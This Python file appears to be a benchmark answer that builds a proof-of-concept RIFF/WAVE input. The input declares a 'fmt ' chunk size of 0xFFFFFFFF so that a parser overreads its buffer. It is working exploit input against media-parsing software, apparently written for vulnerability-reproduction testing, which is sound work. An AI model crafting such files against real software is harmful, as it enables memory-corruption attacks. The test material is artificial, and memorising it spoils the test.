import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a RIFF file with malformed chunk size to cause buffer overflow
        # RIFF header: 'RIFF' + total_size + 'WAVE'
        # Then a chunk with invalid size that extends beyond file boundary
        
        # Total file size will be 58 bytes (ground truth length)
        # We'll create a 'fmt ' chunk with size larger than remaining data
        
        # RIFF header (12 bytes)
        riff_header = b'RIFF'
        # Total size: 58 - 8 = 50 (minus 8 for 'RIFF' and size field)
        total_size = 50
        riff_header += struct.pack('<I', total_size)
        riff_header += b'WAVE'
        
        # 'fmt ' chunk header (8 bytes)
        fmt_chunk = b'fmt '
        # Malformed size: larger than remaining data (58 - 12 - 8 = 38 bytes left)
        # Set size to 0xFFFFFFFF to trigger maximum overflow
        fmt_size = 0xFFFFFFFF  # Will cause buffer overflow
        fmt_chunk += struct.pack('<I', fmt_size)
        
        # Some PCM format data (minimal, 16 bytes)
        # wFormatTag, nChannels, nSamplesPerSec, nAvgBytesPerSec, nBlockAlign, wBitsPerSample
        fmt_data = struct.pack('<HHIIHH', 1, 2, 44100, 176400, 4, 16)
        
        # Pad with zeros to reach 58 bytes total
        # 12 + 8 + 16 = 36 bytes so far
        # Need 22 more bytes (58 - 36 = 22)
        # But we declared fmt_size as 0xFFFFFFFF, so parser will try to read far beyond
        # Add some data chunk to complete file structure
        data_chunk = b'data'
        # data_size = remaining bytes: 58 - 12 - 8 - 16 - 8 = 14
        data_size = 14
        data_chunk += struct.pack('<I', data_size)
        
        # Add some sample data (zeros) - 14 bytes
        sample_data = b'\x00' * data_size
        
        # Combine all parts
        poc = riff_header + fmt_chunk + fmt_data + data_chunk + sample_data
        
        return poc